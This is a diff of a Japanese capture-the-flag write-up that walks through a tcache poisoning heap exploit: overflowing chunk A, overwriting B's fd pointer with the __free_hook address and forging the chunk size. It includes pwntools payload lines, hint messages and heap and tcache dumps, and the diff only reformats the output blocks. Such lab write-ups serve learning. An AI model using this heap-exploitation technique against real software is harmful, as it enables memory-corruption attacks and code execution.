@@ -131,54 +131,54 @@ io.interactive()
 
 何はともあれヒントを見てみる。
 
-```
-Tcache manages freed chunks in linked lists by size.
-Every list can keep up to 7 chunks.
-A freed chunk linked to tcache has a pointer (fd) to the previously freed chunk.
-Let's check what happens when you overwrite fd by Heap Overflow.
-```
+> ```
+> Tcache manages freed chunks in linked lists by size.
+> Every list can keep up to 7 chunks.
+> A freed chunk linked to tcache has a pointer (fd) to the previously freed chunk.
+> Let's check what happens when you overwrite fd by Heap Overflow.
+> ```
 
 まず2でBを`malloc`して適当な値を書き込み、3で`free`する。この時点で4/5を実行すると次のような状態であることがわかる。
 
-```
--=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
- [+] A = 0x558bbf3eb330
- [+] B = (nil)
-                   +--------------------+
-0x0000558bbf3eb320 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb328 | 0x0000000000000021 |
-                   +--------------------+
-0x0000558bbf3eb330 | 0x0000000000000000 | <-- A
-                   +--------------------+
-0x0000558bbf3eb338 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb340 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb348 | 0x0000000000000021 |
-                   +--------------------+
-0x0000558bbf3eb350 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb358 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb360 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb368 | 0x0000000000020ca1 |
-                   +--------------------+
--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-```
+> ```
+> -=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
+>  [+] A = 0x558bbf3eb330
+>  [+] B = (nil)
+>                    +--------------------+
+> 0x0000558bbf3eb320 | 0x0000000000000000 |
+>                    +--------------------+
+> 0x0000558bbf3eb328 | 0x0000000000000021 |
+>                    +--------------------+
+> 0x0000558bbf3eb330 | 0x0000000000000000 | <-- A
+>                    +--------------------+
+> 0x0000558bbf3eb338 | 0x0000000000000000 |
+>                    +--------------------+
+> 0x0000558bbf3eb340 | 0x0000000000000000 |
+>                    +--------------------+
+> 0x0000558bbf3eb348 | 0x0000000000000021 |
+>                    +--------------------+
+> 0x0000558bbf3eb350 | 0x0000000000000000 |
+>                    +--------------------+
+> 0x0000558bbf3eb358 | 0x0000000000000000 |
+>                    +--------------------+
+> 0x0000558bbf3eb360 | 0x0000000000000000 |
+>                    +--------------------+
+> 0x0000558bbf3eb368 | 0x0000000000020ca1 |
+>                    +--------------------+
+> -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+> ```
 
-```
--=-=-=-=-= TCACHE -=-=-=-=-=
-[    tcache (for 0x20)    ]
-        ||
-        \/
-[ 0x0000558bbf3eb350(rw-) ]
-        ||
-        \/
-[      END OF TCACHE      ]
--=-=-=-=-=-=-=-=-=-=-=-=-=-=
-```
+> ```
+> -=-=-=-=-= TCACHE -=-=-=-=-=
+> [    tcache (for 0x20)    ]
+>         ||
+>         \/
+> [ 0x0000558bbf3eb350(rw-) ]
+>         ||
+>         \/
+> [      END OF TCACHE      ]
+> -=-=-=-=-=-=-=-=-=-=-=-=-=-=
+> ```
 
 ヒントにあった`fd`が`0x0000558bbf3eb350`（元々`B`があった場所）になっている。
 この状態で`malloc`を行うと確保されたアドレスとして`0x0000558bbf3eb350`が返ってくるのだが、ヒープレイアウトを見てわかる通り、この領域は`A`のヒープオーバーフローによって書き換えられる。とりあえず目標の`0x0000558bbf3eb350`を`__free_hook`のアドレスに書き換えてみる。先ほどの教訓を生かして最初からpwntoolsを使うことにした。
@@ -189,25 +189,25 @@ p.sendline(b'X' * 0x20 + p64(free_hook_addr))
 
 これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。
 
-```
-It seems __free_hook is successfully linked to tcache!
-But the chunk size is broken or too big maybe...?
-```
+> ```
+> It seems __free_hook is successfully linked to tcache!
+> But the chunk size is broken or too big maybe...?
+> ```
 
-```
--=-=-=-=-= TCACHE -=-=-=-=-=
-[    tcache (for 0x20)    ]
-        ||
-        \/
-[ 0x0000556bb204b350(rw-) ]
-        ||
-        \/
-[ 0x00007fe2b3efe8e8(rw-) ]
-        ||
-        \/
-[      END OF TCACHE      ]
--=-=-=-=-=-=-=-=-=-=-=-=-=-=
-```
+> ```
+> -=-=-=-=-= TCACHE -=-=-=-=-=
+> [    tcache (for 0x20)    ]
+>         ||
+>         \/
+> [ 0x0000556bb204b350(rw-) ]
+>         ||
+>         \/
+> [ 0x00007fe2b3efe8e8(rw-) ]
+>         ||
+>         \/
+> [      END OF TCACHE      ]
+> -=-=-=-=-=-=-=-=-=-=-=-=-=-=
+> ```
 
 `fd`の直前8byteがチャンクサイズなのだが、先ほどの入力では`0x5858585858585858`になっている。これを適当に`0x20`にするとヒントが変わる。
 
@@ -216,18 +216,18 @@ p.sendlineafter("> ", '1')
 p.sendline(b'X' * 0x18 + p64(0x20) + p64(free_hook_addr))
 ```
 
-```
-It seems __free_hook is successfully linked to tcache!
-But you can't get __free_hook since you can only malloc/free B.
-What if you change the chunk size to a value other than 0x20...?
-```
+> ```
+> It seems __free_hook is successfully linked to tcache!
+> But you can't get __free_hook since you can only malloc/free B.
+> What if you change the chunk size to a value other than 0x20...?
+> ```
 
 あまりに大きすぎると先ほどのように壊れていると言われるので、`0x30`にすると次の段階になった。
 
-```
-It seems __free_hook is successfully linked to tcache!
-And the chunk size is properly forged!
-```
+> ```
+> It seems __free_hook is successfully linked to tcache!
+> And the chunk size is properly forged!
+> ```
 
 ここでもう一度`B`の`malloc`と書き込みを行う。ここで書き込む内容はなんでもよい。
 
@@ -238,33 +238,33 @@ p.sendline(b'X' * 0x10)
 
 この段階でのヒントはこんな感じ。
 
-```
-It seems __free_hook is successfully linked to tcache!
-The first link of tcache is __free_hook!
-But B is not empty...
-```
+> ```
+> It seems __free_hook is successfully linked to tcache!
+> The first link of tcache is __free_hook!
+> But B is not empty...
+> ```
 
 `B`を`free`して空にしてみる。
 
-```
-It seems __free_hook is successfully linked to tcache!
-The first link of tcache is __free_hook!
-Also B is empty! You know what to do, right?
-```
+> ```
+> It seems __free_hook is successfully linked to tcache!
+> The first link of tcache is __free_hook!
+> Also B is empty! You know what to do, right?
+> ```
 
 ここでtcacheの状態を見てみると、`B`を`free`したのにここに追加されておらず、`__free_hook`のアドレスだけが残っていることがわかる。
 
-```
--=-=-=-=-= TCACHE -=-=-=-=-=
-[    tcache (for 0x20)    ]
-        ||
-        \/
-[ 0x00007fc20362c8e8(rw-) ]
-        ||
-        \/
-[      END OF TCACHE      ]
--=-=-=-=-=-=-=-=-=-=-=-=-=-=
-```
+> ```
+> -=-=-=-=-= TCACHE -=-=-=-=-=
+> [    tcache (for 0x20)    ]
+>         ||
+>         \/
+> [ 0x00007fc20362c8e8(rw-) ]
+>         ||
+>         \/
+> [      END OF TCACHE      ]
+> -=-=-=-=-=-=-=-=-=-=-=-=-=-=
+> ```
 
 最初のヒントには以下の記載があった。
 
